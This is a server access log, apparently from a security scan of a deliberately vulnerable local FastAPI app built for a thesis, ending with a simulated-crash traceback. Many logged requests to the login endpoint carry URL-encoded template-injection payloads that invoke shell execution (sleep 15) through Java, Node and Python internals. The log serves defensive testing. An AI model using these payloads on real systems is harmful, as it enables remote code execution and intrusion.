+INFO:     127.0.0.1:49478 - "POST /openstack/latest/meta_data.json HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:49454 - "GET /auth/login?username=zj%7B%7B%3D9625*8956%7D%7Dzj&password=ZAP HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:39684 - "POST /auth/login HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49454 - "PUT /users/10 HTTP/1.1" 422 Unprocessable Content
+INFO:     127.0.0.1:49478 - "GET /auth/login?username=zj%3C%25%3D8411*7008%25%3Ezj&password=ZAP HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:39684 - "POST /auth/login HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:39684 - "PUT /users/10 HTTP/1.1" 422 Unprocessable Content
+INFO:     127.0.0.1:49454 - "GET /auth/login?username=zj%23set%28%24x%3D1130*7366%29%24%7Bx%7Dzj&password=ZAP HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49478 - "POST /auth/login HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:39684 - "PUT /users/10 HTTP/1.1" 422 Unprocessable Content
+INFO:     127.0.0.1:49478 - "POST /auth/login HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49454 - "GET /auth/login?username=zj%3Cp+th%3Atext%3D%22%24%7B4893*8189%7D%22%3E%3C%2Fp%3Ezj&password=ZAP HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:39684 - "PUT /users/10 HTTP/1.1" 422 Unprocessable Content
+INFO:     127.0.0.1:49478 - "GET /auth/login?username=zj%7B%40math+key%3D%223762%22+method%3D%22multiply%22+operand%3D%228204%22%2F%7Dzj&password=ZAP HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49454 - "POST /auth/login HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49454 - "PUT /users/10 HTTP/1.1" 422 Unprocessable Content
+INFO:     127.0.0.1:39684 - "GET /auth/login?username=zj%7B%7B93980%7Cadd%3A79290%7D%7Dzj&password=ZAP HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49478 - "POST /auth/login HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49478 - "POST /auth/login HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:39684 - "GET /auth/login?username=zj%7B%7Bprint+%223832%22+%225402%22%7D%7Dzj&password=ZAP HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:39684 - "POST /auth/login HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49478 - "GET /auth/login?username=username&password=zj+9078*9647+zj HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49478 - "POST /auth/login HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:39684 - "GET /auth/login?username=username&password=zj%7B2551*2506%7Dzj HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49478 - "GET /auth/login?username=username&password=zj%24%7B5874*3022%7Dzj HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:39684 - "POST /auth/login HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49478 - "POST /auth/login HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:39684 - "GET /auth/login?username=username&password=zj%23%7B6029*9508%7Dzj HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49478 - "GET /auth/login?username=username&password=zj%7B%235017*2838%7Dzj HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:39684 - "POST /auth/login HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:39684 - "GET /auth/login?username=username&password=zj%7B%406008*3053%7Dzj HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49478 - "POST /auth/login HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:39684 - "POST /auth/login HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49478 - "GET /auth/login?username=username&password=zj%7B%7B9100*6869%7D%7Dzj HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49478 - "POST /auth/login HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:39684 - "GET /auth/login?username=username&password=zj%7B%7B%3D5464*4801%7D%7Dzj HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:39684 - "POST /auth/login HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49478 - "GET /auth/login?username=username&password=zj%3C%25%3D6556*5336%25%3Ezj HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:39684 - "GET /auth/login?username=username&password=zj%23set%28%24x%3D4294*5026%29%24%7Bx%7Dzj HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49478 - "POST /auth/login HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49478 - "GET /auth/login?username=username&password=zj%3Cp+th%3Atext%3D%22%24%7B2565*9676%7D%22%3E%3C%2Fp%3Ezj HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:39684 - "POST /auth/login HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:39684 - "GET /auth/login?username=username&password=zj%7B%40math+key%3D%227791%22+method%3D%22multiply%22+operand%3D%227589%22%2F%7Dzj HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49478 - "POST /auth/login HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49478 - "GET /auth/login?username=username&password=zj%7B%7B12450%7Cadd%3A13180%7D%7Dzj HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49478 - "GET /auth/login?username=username&password=zj%7B%7Bprint+%226820%22+%226455%22%7D%7Dzj HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49478 - "GET / HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:49454 - "GET /admin HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:39684 - "PUT /users/10 HTTP/1.1" 422 Unprocessable Content
+INFO:     127.0.0.1:49478 - "POST /auth/login HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49478 - "GET /auth HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:39684 - "PUT /users/10 HTTP/1.1" 422 Unprocessable Content
+INFO:     127.0.0.1:49454 - "GET /debug HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:49478 - "POST /auth/login HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49466 - "GET /auth/login?username=%3C%23assign+ex%3D%22freemarker.template.utility.Execute%22%3Fnew%28%29%3E+%24%7B+ex%28%22sleep+15%22%29+%7D&password=ZAP HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49466 - "PUT /users/10 HTTP/1.1" 422 Unprocessable Content
+INFO:     127.0.0.1:49454 - "GET /users HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:39684 - "GET /auth/login?username=%23set%28%24engine%3D%22%22%29%0A%23set%28%24proc%3D%24engine.getClass%28%29.forName%28%22java.lang.Runtime%22%29.getRuntime%28%29.exec%28%22sleep+15%22%29%29%0A%23set%28%24null%3D%24proc.waitFor%28%29%29%0A%24%7Bnull%7D&password=ZAP HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49478 - "POST /auth/login HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49478 - "PUT /users/10 HTTP/1.1" 422 Unprocessable Content
+INFO:     127.0.0.1:39684 - "POST /auth/login HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49454 - "GET /auth/login?username=%7B%7B%3D+global.process.mainModule.require%28%27child_process%27%29.execSync%28%27sleep+15%27%29.toString%28%29+%7D%7D&password=ZAP HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:39684 - "PUT /users/10 HTTP/1.1" 422 Unprocessable Content
+INFO:     127.0.0.1:49454 - "GET /auth/login?username=%3C%25%3D+global.process.mainModule.require%28%27child_process%27%29.execSync%28%27sleep+15%27%29.toString%28%29%25%3E&password=ZAP HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49478 - "POST /auth/login HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49478 - "PUT /users/10 HTTP/1.1" 422 Unprocessable Content
+INFO:     127.0.0.1:39684 - "GET /auth/login?username=%23%7Bglobal.process.mainModule.require%28%27child_process%27%29.execSync%28%27sleep+15%27%29.toString%28%29%7D&password=ZAP HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49454 - "POST /auth/login HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49454 - "PUT /users/10 HTTP/1.1" 422 Unprocessable Content
+INFO:     127.0.0.1:39684 - "GET /auth/login?username=%7B%7Brange.constructor%28%22return+eval%28%5C%22global.process.mainModule.require%28%27child_process%27%29.execSync%28%27sleep+15%27%29.toString%28%29%5C%22%29%22%29%28%29%7D%7D&password=ZAP HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49478 - "POST /auth/login HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49478 - "PUT /users/10 HTTP/1.1" 422 Unprocessable Content
+INFO:     127.0.0.1:49454 - "GET /auth/login?username=%7B%7B%22%22.__class__.__mro__%5B1%5D.__subclasses__%28%29%5B157%5D.__repr__.__globals__.get%28%22__builtins__%22%29.get%28%22__import__%22%29%28%22subprocess%22%29.check_output%28%22sleep+15%22%29%7D%7D&password=ZAP HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:39684 - "POST /auth/login HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:39684 - "PUT /users/10 HTTP/1.1" 422 Unprocessable Content
+INFO:     127.0.0.1:49478 - "GET /auth/login?username=%24%7B__import__%28%22subprocess%22%29.check_output%28%22sleep+15%22%2C+shell%3DTrue%29%7D&password=ZAP HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49454 - "POST /auth/login HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49454 - "PUT /users/10 HTTP/1.1" 422 Unprocessable Content
+INFO:     127.0.0.1:39684 - "GET /auth/login?username=%7B%7B__import__%28%22subprocess%22%29.check_output%28%22sleep+15%22%2C+shell%3DTrue%29%7D%7D&password=ZAP HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49478 - "POST /auth/login HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49454 - "PUT /users/10 HTTP/1.1" 422 Unprocessable Content
+INFO:     127.0.0.1:39684 - "GET /auth/login?username=%3C%25%3D%25x%28sleep+15%29%25%3E&password=ZAP HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49478 - "POST /auth/login HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49478 - "PUT /users/10 HTTP/1.1" 422 Unprocessable Content
+INFO:     127.0.0.1:39684 - "POST /auth/login HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49454 - "GET /auth/login?username=%23%7B%25x%28sleep+15%29%7D&password=ZAP HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49454 - "GET /auth/login?username=%7Bsystem%28%22sleep+15%22%29%7D&password=ZAP HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:39684 - "POST /auth/login HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:39684 - "GET /auth/login?username=username&password=%3C%23assign+ex%3D%22freemarker.template.utility.Execute%22%3Fnew%28%29%3E+%24%7B+ex%28%22sleep+15%22%29+%7D HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49454 - "POST /auth/login HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49454 - "GET /auth/login?username=username&password=%23set%28%24engine%3D%22%22%29%0A%23set%28%24proc%3D%24engine.getClass%28%29.forName%28%22java.lang.Runtime%22%29.getRuntime%28%29.exec%28%22sleep+15%22%29%29%0A%23set%28%24null%3D%24proc.waitFor%28%29%29%0A%24%7Bnull%7D HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:39684 - "POST /auth/login HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:39684 - "GET /auth/login?username=username&password=%7B%7B%3D+global.process.mainModule.require%28%27child_process%27%29.execSync%28%27sleep+15%27%29.toString%28%29+%7D%7D HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49454 - "POST /auth/login HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49454 - "GET /auth/login?username=username&password=%3C%25%3D+global.process.mainModule.require%28%27child_process%27%29.execSync%28%27sleep+15%27%29.toString%28%29%25%3E HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:39684 - "POST /auth/login HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:39684 - "GET /auth/login?username=username&password=%23%7Bglobal.process.mainModule.require%28%27child_process%27%29.execSync%28%27sleep+15%27%29.toString%28%29%7D HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49454 - "POST /auth/login HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49454 - "GET /auth/login?username=username&password=%7B%7Brange.constructor%28%22return+eval%28%5C%22global.process.mainModule.require%28%27child_process%27%29.execSync%28%27sleep+15%27%29.toString%28%29%5C%22%29%22%29%28%29%7D%7D HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:39684 - "POST /auth/login HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49454 - "POST /auth/login HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:39684 - "GET /auth/login?username=username&password=%7B%7B%22%22.__class__.__mro__%5B1%5D.__subclasses__%28%29%5B157%5D.__repr__.__globals__.get%28%22__builtins__%22%29.get%28%22__import__%22%29%28%22subprocess%22%29.check_output%28%22sleep+15%22%29%7D%7D HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49454 - "GET /auth/login?username=username&password=%24%7B__import__%28%22subprocess%22%29.check_output%28%22sleep+15%22%2C+shell%3DTrue%29%7D HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:39684 - "POST /auth/login HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:39684 - "GET /auth/login?username=username&password=%7B%7B__import__%28%22subprocess%22%29.check_output%28%22sleep+15%22%2C+shell%3DTrue%29%7D%7D HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49454 - "POST /auth/login HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49454 - "GET /auth/login?username=username&password=%3C%25%3D%25x%28sleep+15%29%25%3E HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:39684 - "POST /auth/login HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:39684 - "GET /auth/login?username=username&password=%23%7B%25x%28sleep+15%29%7D HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49454 - "POST /auth/login HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:39684 - "GET /auth/login?username=username&password=%7Bsystem%28%22sleep+15%22%29%7D HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49454 - "GET / HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:39684 - "POST /auth/login/ HTTP/1.1" 307 Temporary Redirect
+INFO:     127.0.0.1:49478 - "PUT /users/10/ HTTP/1.1" 307 Temporary Redirect
+INFO:     127.0.0.1:49478 - "PUT /users/10 HTTP/1.1" 422 Unprocessable Content
+INFO:     127.0.0.1:39684 - "GET /admin HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:49466 - "GET / HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:49454 - "POST /auth/login HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49454 - "GET /auth HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:49466 - "GET /admin/users/ HTTP/1.1" 307 Temporary Redirect
+INFO:     127.0.0.1:39684 - "GET /admin/ HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:39684 - "GET /admin/users HTTP/1.1" 200 OK
+INFO:     127.0.0.1:39684 - "GET /auth/login/ HTTP/1.1" 307 Temporary Redirect
+INFO:     127.0.0.1:49466 - "GET /debug HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:49454 - "GET /auth/ HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:39684 - "GET /auth/login HTTP/1.1" 422 Unprocessable Content
+INFO:     127.0.0.1:39684 - "GET /debug/ HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:49454 - "GET /users HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:49466 - "GET /openapi.json/ HTTP/1.1" 307 Temporary Redirect
+INFO:     127.0.0.1:49478 - "GET /debug/crash/ HTTP/1.1" 307 Temporary Redirect
+INFO:     127.0.0.1:49454 - "GET /openapi.json HTTP/1.1" 200 OK
+INFO:     127.0.0.1:49466 - "GET /users/ HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:39684 - "GET /users/10/ HTTP/1.1" 307 Temporary Redirect
+INFO:     127.0.0.1:49478 - "GET /debug/crash HTTP/1.1" 500 Internal Server Error
+ERROR:    Exception in ASGI application
+Traceback (most recent call last):
+  File "/home/aline/Documentos/TCC/src/.venv/lib64/python3.14/site-packages/uvicorn/protocols/http/h11_impl.py", line 416, in run_asgi
+    result = await app(  # type: ignore[func-returns-value]
+             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+        self.scope, self.receive, self.send
+        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+    )
+    ^
+  File "/home/aline/Documentos/TCC/src/.venv/lib64/python3.14/site-packages/uvicorn/middleware/proxy_headers.py", line 63, in __call__
+    return await self.app(scope, receive, send)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/aline/Documentos/TCC/src/.venv/lib64/python3.14/site-packages/fastapi/applications.py", line 1163, in __call__
+    await super().__call__(scope, receive, send)
+  File "/home/aline/Documentos/TCC/src/.venv/lib64/python3.14/site-packages/starlette/applications.py", line 96, in __call__
+    await self.middleware_stack(scope, receive, send)
+  File "/home/aline/Documentos/TCC/src/.venv/lib64/python3.14/site-packages/starlette/middleware/errors.py", line 186, in __call__
+    raise exc
+  File "/home/aline/Documentos/TCC/src/.venv/lib64/python3.14/site-packages/starlette/middleware/errors.py", line 164, in __call__
+    await self.app(scope, receive, _send)
+  File "/home/aline/Documentos/TCC/src/.venv/lib64/python3.14/site-packages/starlette/middleware/base.py", line 193, in __call__
+    response = await self.dispatch_func(request, call_next)
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/aline/Documentos/TCC/src/vulnerable_api/app/main.py", line 22, in add_security_headers
+    response = await call_next(request)
+               ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/aline/Documentos/TCC/src/.venv/lib64/python3.14/site-packages/starlette/middleware/base.py", line 168, in call_next
+    raise app_exc from app_exc.__cause__ or app_exc.__context__
+  File "/home/aline/Documentos/TCC/src/.venv/lib64/python3.14/site-packages/starlette/middleware/base.py", line 144, in coro
+    await self.app(scope, receive_or_disconnect, send_no_error)
+  File "/home/aline/Documentos/TCC/src/.venv/lib64/python3.14/site-packages/starlette/middleware/exceptions.py", line 63, in __call__
+    await wrap_app_handling_exceptions(self.app, conn)(scope, receive, send)
+  File "/home/aline/Documentos/TCC/src/.venv/lib64/python3.14/site-packages/starlette/_exception_handler.py", line 53, in wrapped_app
+    raise exc
+  File "/home/aline/Documentos/TCC/src/.venv/lib64/python3.14/site-packages/starlette/_exception_handler.py", line 42, in wrapped_app
+    await app(scope, receive, sender)
+  File "/home/aline/Documentos/TCC/src/.venv/lib64/python3.14/site-packages/fastapi/middleware/asyncexitstack.py", line 18, in __call__
+    await self.app(scope, receive, send)
+  File "/home/aline/Documentos/TCC/src/.venv/lib64/python3.14/site-packages/starlette/routing.py", line 670, in __call__
+    await self.middleware_stack(scope, receive, send)
+  File "/home/aline/Documentos/TCC/src/.venv/lib64/python3.14/site-packages/fastapi/routing.py", line 2734, in app
+    await route.handle(scope, receive, send)
+  File "/home/aline/Documentos/TCC/src/.venv/lib64/python3.14/site-packages/fastapi/routing.py", line 1780, in handle
+    await self.original_router.handle(scope, receive, send)
+  File "/home/aline/Documentos/TCC/src/.venv/lib64/python3.14/site-packages/fastapi/routing.py", line 2789, in handle
+    await included_router._handle_selected(scope, receive, send)
+  File "/home/aline/Documentos/TCC/src/.venv/lib64/python3.14/site-packages/fastapi/routing.py", line 1800, in _handle_selected
+    await original_route.handle(scope, receive, send)
+  File "/home/aline/Documentos/TCC/src/.venv/lib64/python3.14/site-packages/fastapi/routing.py", line 1279, in handle
+    await app(scope, receive, send)
+  File "/home/aline/Documentos/TCC/src/.venv/lib64/python3.14/site-packages/fastapi/routing.py", line 158, in app
+    await wrap_app_handling_exceptions(app, request)(scope, receive, send)
+  File "/home/aline/Documentos/TCC/src/.venv/lib64/python3.14/site-packages/starlette/_exception_handler.py", line 53, in wrapped_app
+    raise exc
+  File "/home/aline/Documentos/TCC/src/.venv/lib64/python3.14/site-packages/starlette/_exception_handler.py", line 42, in wrapped_app
+    await app(scope, receive, sender)
+  File "/home/aline/Documentos/TCC/src/.venv/lib64/python3.14/site-packages/fastapi/routing.py", line 144, in app
+    response = await f(request)
+               ^^^^^^^^^^^^^^^^
+  File "/home/aline/Documentos/TCC/src/.venv/lib64/python3.14/site-packages/fastapi/routing.py", line 706, in app
+    raw_response = await run_endpoint_function(
+                   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+    ...<3 lines>...
+    )
+    ^
+  File "/home/aline/Documentos/TCC/src/.venv/lib64/python3.14/site-packages/fastapi/routing.py", line 354, in run_endpoint_function
+    return await run_in_threadpool(dependant.call, **values)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/aline/Documentos/TCC/src/.venv/lib64/python3.14/site-packages/starlette/concurrency.py", line 34, in run_in_threadpool
+    return await anyio.to_thread.run_sync(func)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/aline/Documentos/TCC/src/.venv/lib64/python3.14/site-packages/anyio/to_thread.py", line 65, in run_sync
+    return await get_async_backend().run_sync_in_worker_thread(
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+        func, args, abandon_on_cancel=abandon_on_cancel, limiter=limiter
+        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+    )
+    ^
+  File "/home/aline/Documentos/TCC/src/.venv/lib64/python3.14/site-packages/anyio/_backends/_asyncio.py", line 2641, in run_sync_in_worker_thread
+    return await future
+           ^^^^^^^^^^^^
+  File "/home/aline/Documentos/TCC/src/.venv/lib64/python3.14/site-packages/anyio/_backends/_asyncio.py", line 1033, in run
+    result = context.run(func, *args)
+  File "/home/aline/Documentos/TCC/src/vulnerable_api/app/routes/misc.py", line 8, in crash
+    raise RuntimeError("Falha simulada para teste de tratamento de erro.")
+RuntimeError: Falha simulada para teste de tratamento de erro.
+INFO:     127.0.0.1:39684 - "GET /users/10 HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:39684 - "GET / HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:39684 - "GET /admin HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:49466 - "PUT /users/10 HTTP/1.1" 422 Unprocessable Content
+INFO:     127.0.0.1:49466 - "GET /auth HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:39684 - "POST /auth/login HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:39684 - "POST /auth/login HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49466 - "GET /debug HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:39684 - "GET /auth/login?username=RxMMsniIiErfvvMToyQAULwaEfXsafjHbTYbURtBEHJsAiJUDutQxOFiJnBjIdYJPHsUNktbKchOQWAeWNlRfXZtFZRXNBosoxGCqpbNmVaWRQYjdqxSDnkygeQabSwQEpNgxEucmPIhFtlxBYwxCGHltStgsMMkmMQIoxjLaMOjCKiBHniVYwPARtXKdtlCMKDPUbkhTexPaKBnBxRWMaBwXNpEJMLIJnUrKHBWhGnnUbLPmKkkvCoRmipvSDUgRxcUepvJrXGThqlsnCPkQaRMPmtWTdBnSWkSKJZfkvVTeoLaZdBjmEjJcjdgAeatYpBvXvvrohxoDFDpIECSZqmQwQkNQQaprEheRmGUisFBYlMpuvowRSDUwonlMWFMEvuKDlELtfleRYnxHDEeJmPPYrqdkbLNaQuvVUaKSqggYHpprAgWWWbOZFufSojsToFkTgGFrBBxHVpFdqssLJcWTTUIeYWUFtkIBSuXxQGLHTJXFmJXYtAEiiFagcRkFBjcNFmmpLJObpxlkmgCRYHpfFdSKpCxdLSIVhpuPqrLLDeyQJVNfNkgnwethpFTGiyrVOmjbrekJNUxqPBFFbmWwutblvSBLWWGZZBxWiJGGHBDIsigXRNTfuGOywrKucpPXnHsIhrOotjLTbdgbmiiZeuSIpZxgimLVrOniaeZhGSEflDpmtHdTypPWAHTemZjYdgNOAwBOeZIQgPDaVQXponTFXQrPKdYbMaLlQTRvhQPUJEtdodychciPDZeSnFeBTmrlfdFDLXStqhDUESkZAOCnCWrLmfvnUCMgWJgumliiSscKYJpGIGVkMBCBORgWaadZSAJBMDtVkkygtKfuZFnwNXuRcIsBkgtCXNkkUmFJKIpbKshRJgwQkeRCZguImowGXmaTXfNqacwxpjXxWyuGptwIcktBvxVIsFIJvoxpNIvklgNmtysjrwjwcBPJjudbEwyTRUIZHAumMDeLWpbHKQsAfTxHkPZGqLFENtGfubfGocDAKhLpalkmxaTaAOjkrkjkOnRwDvehequfLSigxdwaZBlXnmOTqwqBhXofCNYkNPZPTrMjBcvkdfGiIPcolfGKayWmFSLnlvdrGHwllVcVVIjxwWALVCsqRFJnbthRwdEREfweXTSVuNAMaOUoVsYWMkCfujsJoinxHbvkeDOsKMIKsDfVQCuRFdJwmQlQcHSrqjFidYdqmHALniISTXPEVMQTNxGlkLgUOFmNEoahjyyHiRItNYDFYAbCmhHTmeNXsplqJglhsjaFIJrwdxliTZuQosOFNfMlIoKHxdKQFKUyeANNiuaVBNfIoJOWhnnvBdmZVaWODyJkjGtfUketCjWaWBsSQnqZbZGeWyESdvIpUhtasHQaIcqYFQWcvLqvguwRXLWmpmGRacGqrwIwBptPdJRvCrWDvLihJgiwoSadTBULfaoUjKnZOWkdfHfsgTwsbueyyPwgZSidgeTxpbhNdNArmndHqGaegirdmOVUkdBltlPboSwfRRCdCsFalkGLJfSnHojrVFpdNhpsCZgOYcnHDRoIDJhZIcqRrWrWqMqiBxXlciCavEqISTfVZkpuNjrFiCEfRkleXDfoNbKsChLvtdeXlpRqkTgxJgxgsvNELyNfNthJjHDdpmCDLYoOIcSZNVgPLtIlNbkwTOGekGMmCDKPfwmwsGECebGDNivfghkfPGDIGVyuMAdcGXKjOCCpLuIPFSCiBUpGcpWdgxmyZCYqlxJZVFKkHYskCaRbJlMFHOUjvqjdSYnEKHmMiYkCqTadWcUokRWxfQDjEBVowSEubNiHJZfuHeXyUDoQWqgKMDVfmYDBwtPBInchxdgkJiBMKmPnaWjVZZRsQxLGHMjykUhYXEHCjmNlaOuEfDijjIUOkqurDYENOYVlWhneQebdGwChbDwwSWaceAmfDybJBMEcaLMlwChWIBPfVxnJyhxxqiBPIjrMFSnSXBwPEcvlbxCKuyhRvdboUAfhlSegRFbIrJCMWOJnYJdnlIjbcppquoAKVlVtCODlnabIYUwMCObFcSSTyaBCirBobFgLxUthVmAkGjPnXPidnwwRgkqnbfk&password=ZAP HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:39684 - "GET /users HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:49466 - "GET /auth/login?username=username&password=LQeTcXOdiXVbUpHwXIERMVfTsIQfYqsbYBdIpBwactYmPYXQKsxvXVATGLBWJIrRBDCXwoEWLDvPlwYTroHUurCWFDKWauTVwqIvotmPqbnNErZsfZoEMZPvMEYHRTyndnihgTYXddQtnpvJMkBWecMTvUmPOXovpmltFdokcFYQITUJjbkgrZfbHrVDOQwbFbjPwDvJoqihSdNDtPKEueaTTkIOjCXJUSwHyjOgFMMklIoyhagiEshLaSwddYhRjSeMQPLPvvBbJPJKBnarProSrDuJaSVLggeWSNVWVyjrVdFUEUNGjwqntEWvTHUKuBRukMmymYDlUfUCbYpKmFfyOlVdqoDCxiPyXdsVjMayRKhSfxpPKGfOVhARInhWChWaCSYNwJbkpPwGoLnJKtkbZLjMxrgRpnkrMVtLvmXhNBjraTHBZBERSTGNrfwIyGNStjKqXwFsgchuYqCxMHhmNlYLgjNXSaqYuvFRNJqSQQNdEpfKYhXIKxbdVmDNKpQdaxUSCBhgMaHWOghdhMcRwcfGgskymjUbjusRroXxfbRGWSHdQBBOLWRyTPyDgInOsUPeCORMZOkZtRRfpWFdklJXkQAkxEWUTGGjADNTbmqTIkpxcAstypMlDGqhqEQqFMGqWqYueQVGftuOlSoeuAvWLnENtLVIgJaoFjYNRGkWjakahUokRGkbMPhlklmUGhoERrQYIeIMfsFedkeMFDyLmYYXusuqBfWrfijGyyuGQrqsiNncxKjSwDCXnarNobuGVaHQIbcFGVGFhLQfDjqBpOMGieUQCflvYgkpxGTBjXFwZuRJGZtRplQdCMNSLMiHlDvqmoHIYOfqhTlTviOipJwwbVgcxbwmwtycqAXgsFIOwdELowfKMZpZZtqLDdcidgCRJxiffZsXdOaUkfvmfOtAXpIjsCkNoPdSEWldtupwZFktikuUw